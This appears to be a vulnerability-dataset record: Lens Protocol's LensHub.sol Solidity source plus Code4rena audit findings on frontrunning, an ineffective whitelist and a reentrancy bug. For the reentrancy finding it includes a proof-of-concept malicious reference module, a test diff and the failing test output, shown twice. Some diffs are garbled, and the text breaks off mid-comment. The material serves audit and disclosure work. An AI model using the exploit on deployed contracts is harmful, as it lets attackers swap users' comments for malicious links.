vars.pubId,\n                            keccak256(vars.data),\n                            sigNonces[vars.collector]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.collector, vars.sig);\n        InteractionLogic.collect(\n            vars.collector,\n            vars.profileId,\n            vars.pubId,\n            vars.data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function emitFollowNFTTransferEvent(\n        uint256 profileId,\n        uint256 followNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedFollowNFT = _profileById[profileId].followNFT;\n        if (msg.sender != expectedFollowNFT) revert Errors.CallerNotFollowNFT();\n        emit Events.FollowNFTTransferred(profileId, followNFTId, from, to, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function emitCollectNFTTransferEvent(\n        uint256 profileId,\n        uint256 pubId,\n        uint256 collectNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedCollectNFT = _pubByIdByProfile[profileId][pubId].collectNFT;\n        if (msg.sender != expectedCollectNFT) revert Errors.CallerNotCollectNFT();\n        emit Events.CollectNFTTransferred(\n            profileId,\n            pubId,\n            collectNFTId,\n            from,\n            to,\n            block.timestamp\n        );\n    }\n\n    /// *********************************\n    /// *****EXTERNAL VIEW FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function isProfileCreatorWhitelisted(address profileCreator)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _profileCreatorWhitelisted[profileCreator];\n    }\n\n    /// @inheritdoc ILensHub\n    function isFollowModuleWhitelisted(address followModule) external view override returns (bool) {\n        return _followModuleWhitelisted[followModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function isReferenceModuleWhitelisted(address referenceModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _referenceModuleWhitelisted[referenceModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function isCollectModuleWhitelisted(address collectModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _collectModuleWhitelisted[collectModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function getGovernance() external view override returns (address) {\n        return _governance;\n    }\n\n    /// @inheritdoc ILensHub\n    function getDispatcher(uint256 profileId) external view override returns (address) {\n        return _dispatcherByProfile[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubCount(uint256 profileId) external view override returns (uint256) {\n        return _profileById[profileId].pubCount;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFT(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFTURI(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].followNFTURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectNFT(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowModule(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getReferenceModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].referenceModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getHandle(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].handle;\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubPointer(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (uint256, uint256)\n    {\n        uint256 profileIdPointed = _pubByIdByProfile[profileId][pubId].profileIdPointed;\n        uint256 pubIdPointed = _pubByIdByProfile[profileId][pubId].pubIdPointed;\n        return (profileIdPointed, pubIdPointed);\n    }\n\n    /// @inheritdoc ILensHub\n    function getContentURI(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (string memory)\n    {\n        (uint256 rootProfileId, uint256 rootPubId, ) = Helpers.getPointedIfMirror(\n            profileId,\n            pubId,\n            _pubByIdByProfile\n        );\n        return _pubByIdByProfile[rootProfileId][rootPubId].contentURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfileIdByHandle(string calldata handle) external view override returns (uint256) {\n        bytes32 handleHash = keccak256(bytes(handle));\n        return _profileIdByHandleHash[handleHash];\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfile(uint256 profileId)\n        external\n        view\n        override\n        returns (DataTypes.ProfileStruct memory)\n    {\n        return _profileById[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPub(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (DataTypes.PublicationStruct memory)\n    {\n        return _pubByIdByProfile[profileId][pubId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubType(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (DataTypes.PubType)\n    {\n        if (pubId == 0 || _profileById[profileId].pubCount < pubId) {\n            return DataTypes.PubType.Nonexistent;\n        } else if (_pubByIdByProfile[profileId][pubId].collectModule == address(0)) {\n            return DataTypes.PubType.Mirror;\n        } else {\n            if (_pubByIdByProfile[profileId][pubId].profileIdPointed == 0) {\n                return DataTypes.PubType.Post;\n            } else {\n                return DataTypes.PubType.Comment;\n            }\n        }\n    }\n\n    /**\n     * @dev Overrides the ERC721 tokenURI function to return the associated URI with a given profile.\n     */\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        return _profileById[tokenId].imageURI; // temp\n    }\n\n    /// ****************************\n    /// *****INTERNAL FUNCTIONS*****\n    /// ****************************\n\n    function _setGovernance(address newGovernance) internal {\n        address prevGovernance = _governance;\n        _governance = newGovernance;\n        emit Events.GovernanceSet(msg.sender, prevGovernance, newGovernance, block.timestamp);\n    }\n\n    function _createPost(\n        uint256 profileId,\n        string memory contentURI,\n        address collectModule,\n        bytes memory collectModuleData,\n        address referenceModule,\n        bytes memory referenceModuleData\n    ) internal {\n        PublishingLogic.createPost(\n            profileId,\n            contentURI,\n            collectModule,\n            collectModuleData,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _createComment(DataTypes.CommentData memory vars) internal {\n        PublishingLogic.createComment(\n            vars,\n            _profileById[vars.profileId].pubCount + 1,\n            _profileById,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n        _profileById[vars.profileId].pubCount++;\n    }\n\n    function _createMirror(\n        uint256 profileId,\n        uint256 profileIdPointed,\n        uint256 pubIdPointed,\n        address referenceModule,\n        bytes calldata referenceModuleData\n    ) internal {\n        PublishingLogic.createMirror(\n            profileId,\n            profileIdPointed,\n            pubIdPointed,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _setDispatcher(uint256 profileId, address dispatcher) internal {\n        _dispatcherByProfile[profileId] = dispatcher;\n        emit Events.DispatcherSet(profileId, dispatcher, block.timestamp);\n    }\n\n    function _setProfileImageURI(uint256 profileId, string memory imageURI) internal {\n        _profileById[profileId].imageURI = imageURI;\n        emit Events.ProfileImageURISet(profileId, imageURI, block.timestamp);\n    }\n\n    function _setFollowNFTURI(uint256 profileId, string memory followNFTURI) internal {\n        _profileById[profileId].followNFTURI = followNFTURI;\n        emit Events.FollowNFTURISet(profileId, followNFTURI, block.timestamp);\n    }\n\n    function _clearHandleHash(uint256 profileId) internal {\n        bytes32 handleHash = keccak256(bytes(_profileById[profileId].handle));\n        _profileIdByHandleHash[handleHash] = 0;\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        if (_dispatcherByProfile[tokenId] != address(0)) {\n            _setDispatcher(tokenId, address(0));\n        }\n        super._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId) && msg.sender != _dispatcherByProfile[profileId])\n            revert Errors.NotProfileOwnerOrDispatcher();\n    }\n\n    function _validateCallerIsProfileOwner(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId)) revert Errors.NotProfileOwner();\n    }\n\n    function _validateCallerIsGovernance() internal view {\n        if (msg.sender != _governance) revert Errors.NotGovernance();\n    }\n\n    function _validateCallerIsWhitelistedProfileCreator() internal view {\n        if (!_profileCreatorWhitelisted[msg.sender]) revert Errors.ProfileCreatorNotWhitelisted();\n    }\n\n    function getRevision() internal pure virtual override returns (uint256) {\n        return REVISION;\n    }\n}\n\n\n",
        "CodeNames": [
            "LensHub.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-03",
                "Location": [
                    "createProfile"
                ],
                "Type": " Profile creation can be frontrun",
                "Description": "\nPublishingLogic.sol#L50(https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/libraries/PublishingLogic.sol#L50)<br\n\nThe LensHub/PublishingLogic.createProfile function can be frontrun by other whitelisted profile creators.<br\nAn attacker can observe pending createProfile transactions and frontrun them, own that handle, and demand ransom from the original transaction creator.\n\n",
                "Repair": "\nEveryone needs to use flashbots / private transactions but it might not be available on the deployed chain.<br\nA commit/reveal scheme for the handle and the entire profile creation could mitigate this issue.\n\ndonosonaumczuk (Aave Lens) disputed(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26)\n\noneski (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1042222585):\n  Declined. This is by design. Governance can allow contracts/addresses to mint. If governance allows a malicious actor that is the fault of governance. Governance can also allow contracts that implement auction/commit reveal or other functionality as well to manage the profile minting system.\n \n The protocol should take no opinion on this by default.\n\n0xleastwood (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1117272513):\n  While I agree that this is the fault of the governance, I think it still stands that any whitelisted user may be compromised or become malicious at a later point in time. For that reason, I think this issue has some validity although due to the unlikely nature (requiring a faulty governance), I'll mark this as medium risk for now.\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1125573841):\n  I disagree on the medium risk. Governance being faulty is not enough of a reason IMO. Like most governance-included protocols, governance getting compromised bears risks that are largely unavoidable.\n\n0xleastwood (judge) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1125814379):\n  While I agree that a faulty governance is an extremely unlikely outcome. It isn't stated in the README and as per the judges' guidelines, profiles can be front-run under specific stated assumptions/external requirements. A malicious whitelisted profile creator can reasonably front-run other creators. \n \n \n 2 \u2014 Med (M): vulns have a risk of 2 and are considered \u201cMedium\u201d severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n \n\nZer0dot (Aave Lens) acknowledged and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1126095390):\n  Fair enough, though we were aware of this-it's clear it falls into a medium severity. We're acknowledging this!\n\n\n\n*\n\n\n"
            },
            {
                "Name": "M-12",
                "Location": [
                    "//solidity\nfunction _validateCallerIsWhitelistedProfileCreator() internal view {\n    if (!_profileCreatorWhitelisted[msg.sender]) revert Errors.ProfileCreatorNotWhitelisted();\n}\n"
                ],
                "Type": " Ineffective Whitelist",
                "Description": "\nLensHub.sol#L146(https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/LensHub.sol#L146)<br\n\nCreating profiles through LensHub.createProfile requires the caller to be whitelisted.\n\nsolidity\nfunction _validateCallerIsWhitelistedProfileCreator() internal view {\n    if (!_profileCreatorWhitelisted[msg.sender]) revert Errors.ProfileCreatorNotWhitelisted();\n}\n\n\nHowever, a single whitelisted account can create as many profiles as they want and send the profile NFT to other users.<br\nThey can create unlimited profiles on behalf of other users which makes the whitelist not effective.\n\n",
                "Repair": "\nConsider limiting the number of profile creations per whitelisted user or severely limiting who is allowed to create profiles, basically making profile creation a centralized system.\n\noneski (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30#issuecomment-1042138981):\n  Declined, this is by design.\n \n Governance will decide what contracts are allowed to mint via the allowlist. If governance wishes to have a more centralized system, it will only approve contracts that have numerical caps within their code.\n\nZer0dot (Aave Lens) disputed(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30)\n\n0xleastwood (judge) marked invalid and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30#issuecomment-1118548551):\n  I agree with the sponsor, I think this can already be handled by the governance strictly approving contracts with numerical caps or limiting the allowlist of who can create a profile. As such, I'm inclined to mark this as invalid because the recommendation can already be implemented or adhered to by the governance.\n\n0xleastwood (judge) re-assessed as Medium severity and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30#issuecomment-1118566774):\n  In light of another issue, I will mark this as a valid issue because #66(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66) outlines a similar concern. The two issues reference different parts of the codebase so I think its fair to keep them distinct. However, I'd normally like to see a bit more detail on how non-whitelisted users can benefit from an infinite minter.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "M-13",
                "Location": [
                    "diff\ndiff --git a/MockReferenceModule.sol.original b/MockReferenceModule.sol\nindex 2552faf..0fe464b 100644\n--a/MockReferenceModule.sol.original\n+++ b/MockReferenceModule.sol\n@@ -3,23 +3,46 @@\n pragma //solidity 0.8.10;\n \n import {IReferenceModule} from '../interfaces/IReferenceModule.sol';\n-\n+import {ILensHub} from '../interfaces/ILensHub.sol';\n+import {DataTypes} from '../libraries/DataTypes.sol';\n contract MockReferenceModule is IReferenceModule {\n     function initializeReferenceModule(\n         uint256 profileId,\n         uint256 pubId,\n         bytes calldata data\n   ) external pure override returns (bytes memory) {\n+    ) external override returns (bytes memory) {\n         uint256 number = abi.decode(data, (uint256));\n         require(number == 1, 'MockReferenceModule: invalid');\n+        l = msg.sender;\n         return new bytes(0);\n     }\n \n+    address l;\n+    bool a;\n     function processComment(\n         uint256 profileId,\n         uint256 profileIdPointed,\n         uint256 pubIdPointed\n   ) external override {}\n+    ) external override {\n+        if (a) return;\n+        a = true;\n+        bytes memory garbage;\n+        string memory handle = \"attack.eth\";\n+        uint256 pid = ILensHub(l).getProfileIdByHandle(handle);\n+        ILensHub(l).comment(\n+            DataTypes.CommentData(\n+                profileId,\n+                // make their comment and thus their profile link\n+                // to our malicious payload\n+                \"https://yourCommentIsNowOnALinkToMalware.com/forever\",\n+                profileIdPointed,\n+                pubIdPointed,\n+                ILensHub(l).getCollectModule(profileIdPointed, pubIdPointed),\n+                garbage,\n+                address(0x0),\n+                garbage\n+        ));\n+    }\n \n     function processMirror(\n         uint256 profileId,\n",
                    "//solidity\n    function _createComment(DataTypes.CommentData memory vars) internal {\n        PublishingLogic.createComment(\n            vars,\n            _profileById[vars.profileId].pubCount + 1,\n            _profileById,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n        _profileById[vars.profileId].pubCount++;\n    }\n",
                    "diff\ndiff --git a/publishing-comments.spec.ts.original b/publishing-comments.spec.ts\nindex 471ba68..32dfb3a 100644\n--a/publishing-comments.spec.ts.original\n+++ b/publishing-comments.spec.ts\n@@ -3,6 +3,11 @@ import { expect } from 'chai';\n import { MAX_UINT256, ZERO_ADDRESS } from '../../helpers/constants';\n import { ERRORS } from '../../helpers/errors';\n import { cancelWithPermitForAll, getCommentWithSigParts } from '../../helpers/utils';\n+import {\n+  getTimestamp,\n+  matchEvent,\n+  waitForTx,\n+} from '../../helpers/utils';\n import {\n   abiCoder,\n   emptyCollectModule,\n@@ -59,7 +64,7 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         })\n       ).to.not.be.reverted;\n     });\n-\n+/\n     context('Negatives', function () {\n       it('UserTwo should fail to publish a comment to a profile owned by User', async function () {\n         await expect(\n@@ -151,8 +156,9 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         ).to.be.revertedWith(ERRORS.PUBLICATION_DOES_NOT_EXIST);\n       });\n     });\n-\n+//\n     context('Scenarios', function () {\n+/\n       it('User should create a comment with empty collect module data, reference module, and reference module data, fetched comment data should be accurate', async function () {\n         await expect(\n           lensHub.comment({\n@@ -175,8 +181,23 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         expect(pub.collectNFT).to.eq(ZERO_ADDRESS);\n         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);\n       });\n-\n+//\n       it('User should create a post using the mock reference module as reference module, then comment on that post', async function () {\n+\n+        // user acquires account and sets up the attacking profile\n+        await expect(\n+          lensHub.createProfile({\n+            to: mockReferenceModule.address,\n+            handle: \"attack.eth\",\n+            imageURI: MOCK_PROFILE_URI,\n+            followModule: ZERO_ADDRESS,\n+            followModuleData: ],\n+            followNFTURI: MOCK_FOLLOW_NFT_URI,\n+          })\n+        ).to.not.be.reverted;\n+        await lensHub.setDispatcher(FIRST_PROFILE_ID, mockReferenceModule.address);\n+\n+        // create a post\n         const data = abiCoder.encode(['uint256'], '1']);\n         await expect(\n           lensHub.post({\n@@ -189,22 +210,43 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n           })\n         ).to.not.be.reverted;\n \n       await expect(\n+        // create extremely interesting bait comment\n+        const BAIT_COMMENT = \"https://somethingExtremelyInteresting.com/toGetEngagement\";\n+        let receipt = await waitForTx(\n           lensHub.comment({\n             profileId: FIRST_PROFILE_ID,\n           contentURI: MOCK_URI,\n+            contentURI: BAIT_COMMENT,\n             collectModule: emptyCollectModule.address,\n             collectModuleData: ],\n             profileIdPointed: FIRST_PROFILE_ID,\n             pubIdPointed: 2,\n             referenceModule: ZERO_ADDRESS,\n             referenceModuleData: ],\n         })\n       ).to.not.be.reverted;\n+          },{gasLimit:12450000})\n+        );\n+\n+        // see the bait in the emitted event...\n+        matchEvent(receipt, 'CommentCreated', \n+          FIRST_PROFILE_ID,\n+          3, // pubId 3 for profile 1\n+          BAIT_COMMENT, // <-correct bait in the event\n+          FIRST_PROFILE_ID,\n+          2,\n+          emptyCollectModule.address,\n+          ],\n+          ZERO_ADDRESS,\n+          ],\n+          await getTimestamp(),\n+        ]);\n+\n+        // ...but malware when read, commented, or referenced\n+        let pub = await lensHub.getPub(FIRST_PROFILE_ID, 3);\n+        await expect(pub.contentURI)\n+          .to.equal(BAIT_COMMENT);\n       });\n     });\n   });\n-\n+/\n   context('Meta-tx', function () {\n     beforeEach(async function () {\n       await expect(\n@@ -567,5 +609,5 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);\n       });\n     });\n });\n+  });//\n });\n",
                    "diff\n\n  Publishing Comments\n    Generic\n      Scenarios\n        1) User should create a post using the mock reference module as reference module, then comment on that post\n\n\n  0 passing (19s)\n  1 failing\n\n  1) Publishing Comments\n       Generic\n         Scenarios\n           User should create a post using the mock reference module as reference module, then comment on that post:\n\n      AssertionError: expected 'https://yourCommentIsNowOnALinkToMalware.com/forever' to equal 'https://somethingExtremelyInteresting.com/toGetEngagement'\n      + expected actual\n\n      -https://yourCommentIsNowOnALinkToMalware.com/forever\n      +https://somethingExtremelyInteresting.com/toGetEngagement\n      \n      at Context.<anonymous (test/hub/interactions/publishing-comments.spec.ts:245:15)\n      at processTicksAndRejections (internal/process/task_queues.js:97:5)\n      at runNextTicks (internal/process/task_queues.js:66:3)\n      at listOnTimeout (internal/timers.js:523:9)\n      at processTimers (internal/timers.js:497:7)\n\n"
                ],
                "Type": " Reentrancy allows commenter to overwrite own comments",
                "Description": "\nSince the Lens platform is a blockchain-based social media platform, it's important that information relevant to users be emitted so that light clients need not continually refer to the blockchain, which can be expensive. From the docs:\n\nEvents are emitted at every state-changing function call, in addition to standard ERC721 events. Events often include the timestamp as a specific parameter, which allows for direct consumption using a bloom filter without needing to fetch block context on every event.\n\nAs such, it is important that the content of emitted events matches what direct lookups of publication data shows.\n\n\nDue to the reentrancy bug outlined below, an attacker is able to emit a comment containing some information that does not match the actual information of a post, allowing him/her to trick light clients into responding to a post that they otherwise would have avoided. The attacker can use this to propagate scams, serve malware, or otherwise poison other user's profiles with unwanted content. Because there is no way to disable publications after the fact, these commenters' profiles now link to this bad content forever.\n\n\nAccording to the developers in the contest discord, the intention is for the whitelisting of modules to eventually be disabled altogether, or moved to be controlled by a DAO. The main purpose of the whitelist is to make sure that the modules written and used by everyone are built and scoped appropriately, not to limit calls to outside contracts (i.e. the module does what it does in the most efficient manner, using the method requiring the fewest outside contract calls). As such it's reasonable to assume that at some point in the future, an attacker will be able to find or write a ReferenceModule that enables him/her to trigger a function in a contract he/she owns (e.g. transfer an NFT, triggering an ERC721 pre-transfer approval check callback). Below is a version of this where, for simplicity's sake, the malicious code is directly in the module rather than being called by a callback somehow.\n\ndiff\ndiff --git a/MockReferenceModule.sol.original b/MockReferenceModule.sol\nindex 2552faf..0fe464b 100644\n--a/MockReferenceModule.sol.original\n+++ b/MockReferenceModule.sol\n@@ -3,23 +3,46 @@\n pragma solidity 0.8.10;\n \n import {IReferenceModule} from '../interfaces/IReferenceModule.sol';\n-\n+import {ILensHub} from '../interfaces/ILensHub.sol';\n+import {DataTypes} from '../libraries/DataTypes.sol';\n contract MockReferenceModule is IReferenceModule {\n     function initializeReferenceModule(\n         uint256 profileId,\n         uint256 pubId,\n         bytes calldata data\n   ) external pure override returns (bytes memory) {\n+    ) external override returns (bytes memory) {\n         uint256 number = abi.decode(data, (uint256));\n         require(number == 1, 'MockReferenceModule: invalid');\n+        l = msg.sender;\n         return new bytes(0);\n     }\n \n+    address l;\n+    bool a;\n     function processComment(\n         uint256 profileId,\n         uint256 profileIdPointed,\n         uint256 pubIdPointed\n   ) external override {}\n+    ) external override {\n+        if (a) return;\n+        a = true;\n+        bytes memory garbage;\n+        string memory handle = \"attack.eth\";\n+        uint256 pid = ILensHub(l).getProfileIdByHandle(handle);\n+        ILensHub(l).comment(\n+            DataTypes.CommentData(\n+                profileId,\n+                // make their comment and thus their profile link\n+                // to our malicious payload\n+                \"https://yourCommentIsNowOnALinkToMalware.com/forever\",\n+                profileIdPointed,\n+                pubIdPointed,\n+                ILensHub(l).getCollectModule(profileIdPointed, pubIdPointed),\n+                garbage,\n+                address(0x0),\n+                garbage\n+        ));\n+    }\n \n     function processMirror(\n         uint256 profileId,\n\n\nAs for triggering the actual attack, the attacker first acquires a profile with a lot of followers either by organically growing a following, stealing a profile's NFT, or buying access to one. Next, the attacker publishes interesting content with the malicious ReferenceModule, and finally, the attacker publishes an extremely engaging/viral comment to that publication, which will cause lots of other people to respond to it. The comment will emit an event that contains the original comment information, but the module will be able to overwrite the actual published comment on the blockchain with the attacker's alternate content due to a reentrancy bug where the pubCount can be overwritten:\n\nsolidity\n    function _createComment(DataTypes.CommentData memory vars) internal {\n        PublishingLogic.createComment(\n            vars,\n            _profileById[vars.profileId].pubCount + 1,\n            _profileById,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n        _profileById[vars.profileId].pubCount++;\n    }\n\n\nLensHub.sol#L878-L888(https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/LensHub.sol#L878-L888)<br\n\nThe following test uses this altered module and shows that the attacker can emit a different comment than is actually stored by/used for subsequent comments:\n\ndiff\ndiff --git a/publishing-comments.spec.ts.original b/publishing-comments.spec.ts\nindex 471ba68..32dfb3a 100644\n--a/publishing-comments.spec.ts.original\n+++ b/publishing-comments.spec.ts\n@@ -3,6 +3,11 @@ import { expect } from 'chai';\n import { MAX_UINT256, ZERO_ADDRESS } from '../../helpers/constants';\n import { ERRORS } from '../../helpers/errors';\n import { cancelWithPermitForAll, getCommentWithSigParts } from '../../helpers/utils';\n+import {\n+  getTimestamp,\n+  matchEvent,\n+  waitForTx,\n+} from '../../helpers/utils';\n import {\n   abiCoder,\n   emptyCollectModule,\n@@ -59,7 +64,7 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         })\n       ).to.not.be.reverted;\n     });\n-\n+/\n     context('Negatives', function () {\n       it('UserTwo should fail to publish a comment to a profile owned by User', async function () {\n         await expect(\n@@ -151,8 +156,9 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         ).to.be.revertedWith(ERRORS.PUBLICATION_DOES_NOT_EXIST);\n       });\n     });\n-\n+//\n     context('Scenarios', function () {\n+/\n       it('User should create a comment with empty collect module data, reference module, and reference module data, fetched comment data should be accurate', async function () {\n         await expect(\n           lensHub.comment({\n@@ -175,8 +181,23 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         expect(pub.collectNFT).to.eq(ZERO_ADDRESS);\n         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);\n       });\n-\n+//\n       it('User should create a post using the mock reference module as reference module, then comment on that post', async function () {\n+\n+        // user acquires account and sets up the attacking profile\n+        await expect(\n+          lensHub.createProfile({\n+            to: mockReferenceModule.address,\n+            handle: \"attack.eth\",\n+            imageURI: MOCK_PROFILE_URI,\n+            followModule: ZERO_ADDRESS,\n+            followModuleData: ],\n+            followNFTURI: MOCK_FOLLOW_NFT_URI,\n+          })\n+        ).to.not.be.reverted;\n+        await lensHub.setDispatcher(FIRST_PROFILE_ID, mockReferenceModule.address);\n+\n+        // create a post\n         const data = abiCoder.encode(['uint256'], '1']);\n         await expect(\n           lensHub.post({\n@@ -189,22 +210,43 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n           })\n         ).to.not.be.reverted;\n \n       await expect(\n+        // create extremely interesting bait comment\n+        const BAIT_COMMENT = \"https://somethingExtremelyInteresting.com/toGetEngagement\";\n+        let receipt = await waitForTx(\n           lensHub.comment({\n             profileId: FIRST_PROFILE_ID,\n           contentURI: MOCK_URI,\n+            contentURI: BAIT_COMMENT,\n             collectModule: emptyCollectModule.address,\n             collectModuleData: ],\n             profileIdPointed: FIRST_PROFILE_ID,\n             pubIdPointed: 2,\n             referenceModule: ZERO_ADDRESS,\n             referenceModuleData: ],\n         })\n       ).to.not.be.reverted;\n+          },{gasLimit:12450000})\n+        );\n+\n+        // see the bait in the emitted event...\n+        matchEvent(receipt, 'CommentCreated', \n+          FIRST_PROFILE_ID,\n+          3, // pubId 3 for profile 1\n+          BAIT_COMMENT, // <-correct bait in the event\n+          FIRST_PROFILE_ID,\n+          2,\n+          emptyCollectModule.address,\n+          ],\n+          ZERO_ADDRESS,\n+          ],\n+          await getTimestamp(),\n+        ]);\n+\n+        // ...but malware when read, commented, or referenced\n+        let pub = await lensHub.getPub(FIRST_PROFILE_ID, 3);\n+        await expect(pub.contentURI)\n+          .to.equal(BAIT_COMMENT);\n       });\n     });\n   });\n-\n+/\n   context('Meta-tx', function () {\n     beforeEach(async function () {\n       await expect(\n@@ -567,5 +609,5 @@ makeSuiteCleanRoom('Publishing Comments', function () {\n         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);\n       });\n     });\n });\n+  });//\n });\n\n\nAfter applying the above changes, running npm test test/hub/interactions/publishing-comments.spec.ts yields:\n\ndiff\n\n  Publishing Comments\n    Generic\n      Scenarios\n        1) User should create a post using the mock reference module as reference module, then comment on that post\n\n\n  0 passing (19s)\n  1 failing\n\n  1) Publishing Comments\n       Generic\n         Scenarios\n           User should create a post using the mock reference module as reference module, then comment on that post:\n\n      AssertionError: expected 'https://yourCommentIsNowOnALinkToMalware.com/forever' to equal 'https://somethingExtremelyInteresting.com/toGetEngagement'\n      + expected actual\n\n      -https://yourCommentIsNowOnALinkToMalware.com/forever\n      +https://somethingExtremelyInteresting.com/toGetEngagement\n      \n      at Context.<anonymous (test/hub/interactions/publishing-comments.spec.ts:245:15)\n      at processTicksAndRejections (internal/process/task_queues.js:97:5)\n      at runNextTicks (internal/process/task_queues.js:66:3)\n      at listOnTimeout (internal/timers.js:523:9)\n      at processTimers (internal/timers.js:497:7)\n\n\n\nAnyone that has commented on the engaging comment now has unwittingly commented on a malicious URI, potentially encouraging others to visit the URI.\n\n\nCode inspection\nHardhat\n\n",
                "Repair": "\nStore the new pubCount in a variable before the comment is created and use it during the creation rather than choosing it afterwards.\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1072763598):\n  This is valid and interesting! Especially because it can be attributed to incompetence instead of maliciousness on behalf of governance whitelisting a faulty module (which can also lead to loss of funds, etc). However, this does emit *multiple* events with the same publication ID, and thus I believe UIs can filter it, if ever it becomes an issue.\n \n On that front, the mitigation introduces another issue in that incrementing the pubId before creating the comment allows a comment to comment on itself. Paging @miguelmtzinf, wdyt? Also paging @donosonaumczuk.\n\nZer0dot (Aave Lens) acknowledged and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1079380448):\n  We acknowledge this and will not be acting on it. I think it's fair to say that if such a vulnerability is found, the double event emission can be a red flag, and governance can act promptly to unwhitelist the specific module. Note that there's already nothing stopping malware or illegal content links from appearing on UIs, who already need to do filtering. Still, this is valid!\n\n0xleastwood (judge) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45#issuecomment-1116615338):\n  Upon first glance, this seems to be valid. An attacker could emit multiple events for a given comment, tricking light clients into responding to a potentially malicious post. However, it requires that reference modules are no longer whitelisted, allowing anyone to register a dodgy module or the 